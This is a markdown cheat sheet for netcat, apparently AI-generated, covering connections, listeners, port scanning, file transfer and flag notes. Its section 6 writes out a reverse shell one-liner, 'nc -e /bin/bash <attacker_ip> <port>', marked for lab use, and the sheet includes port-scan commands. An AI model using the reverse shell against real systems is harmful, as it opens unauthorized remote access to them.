 # 🛠️ Netcat (nc) Cheat Sheet

Netcat is a versatile networking tool used for reading/writing data over TCP/UDP. It's often called the "Swiss Army knife" of networking.

---

## 🔧 Basic Syntax

nc [options] [host] [port]

# `nc` (netcat) Quick Reference 🚀

A compact, ready-to-copy reference for common **netcat (`nc`)** use cases, useful flags, compatibility notes, and safe-practice reminders. Save as `nc-cheatsheet.md`.

---

## 🚀 Common Use Cases

### 1. Connect to a Remote Port  
Test if a service is running.
```bash
nc <target_ip> <port>
```

### 2. Listen for Incoming Connections  
Set up a listener (e.g., for reverse shells or chat).
```bash
nc -lvp <port>
```

### 3. Port Scanning  
Scan for open ports.
```bash
nc -zv <target_ip> <start_port>-<end_port>
```

### 4. File Transfer

**Sender:**
```bash
nc -lvp 4444 < file.txt
```

**Receiver:**
```bash
nc <sender_ip> 4444 > file.txt
```

### 5. Simple Chat Between Two VMs

**On one VM:**
```bash
nc -lvp 1234
```

**On the other:**
```bash
nc <target_ip> 1234
```

### 6. Reverse Shell (Lab Use Only)
```bash
nc -e /bin/bash <attacker_ip> <port>
```
> ⚠️ Use only in ethical, controlled environments.

---

## ➕ Additional Useful Examples

### UDP Examples
```bash
# UDP connect
nc -u <target_ip> <port>

# UDP listen (verbose)
nc -luv <port>
```

### IPv6
```bash
nc -6 <ipv6_address> <port>
```

### Timeouts, Numeric-only, Close-on-EOF
```bash
nc -w 5 -zv 192.168.1.10 22-80   # -w set timeout (seconds)
nc -n <target_ip> <port>         # skip DNS resolution (numeric only)
nc -N -lvp 4444                  # close on remote EOF (if supported)
```

### Bind Source IP / Source Port
```bash
nc -s <source_ip> -p <source_port> <target_ip> <port>
```

### Secure Alternatives / TLS (when available)
```bash
# ncat (from Nmap) with SSL
ncat --ssl <host> <port>

# OpenSSL client for TLS
openssl s_client -connect <host>:<port>
```

---

## 🧠 Flags to Remember

| Flag  | Description                                              |
|-------|----------------------------------------------------------|
| `-l`  | Listen mode                                              |
| `-v`  | Verbose output                                           |
| `-p`  | Local port                                               |
| `-z`  | Zero-I/O mode (used for port scanning)                   |
| `-e`  | Execute program after connection (if supported)          |
| `-u`  | Use UDP instead of TCP                                   |
| `-n`  | Numeric-only; skip DNS lookups                           |
| `-w`  | Timeout (seconds)                                        |
| `-N`  | Close connection on EOF (if supported)                   |
| `-6`  | Use IPv6                                                 |

---

## ⚠️ Compatibility Notes

- Many modern distributions use **OpenBSD `nc`**, which often **does NOT** support `-e`.  
- `ncat` (from Nmap) may offer `--exec`/`--allow` and built-in SSL support.  
- Windows users may have `ncat` instead of standard GNU/OpenBSD `nc`.  
- Behavior and available flags vary by implementation — check `man nc` or `nc -h` on your system.

---

## 📌 Safety & Legal Reminder

- **Not encrypted** — do **not** transmit sensitive data with plain `nc` over untrusted networks.  
- Use `nc` only on systems and networks you own or are explicitly authorized to test. Unauthorized access or attacks are illegal.  
- Prefer `ncat --ssl` or `openssl s_client` for encrypted sessions when appropriate.

---

## ✅ Quick Example: Port Check + Verbose + Timeout
```bash
nc -zv -w 3 192.168.1.10 22-80
```

---

## ✅ Quick Reference (one-liners)
```bash
# Check TCP service
nc target.example.com 80

# Start listener (TCP)
nc -lvp 4444

# UDP listen
nc -luv 5000

# Port scan
nc -zv 10.0.0.5 1-1024

# File transfer (sender)
nc -lvp 4444 < file.txt

# File transfer (receiver)
nc sender_ip 4444 > file.txt

# TLS using ncat (if available)
ncat --ssl example.com 443
```

---

Let me know if you want a version with Metasploitable2 examples or a companion markdown for `ncat` (the enhanced Netcat from Nmap)!


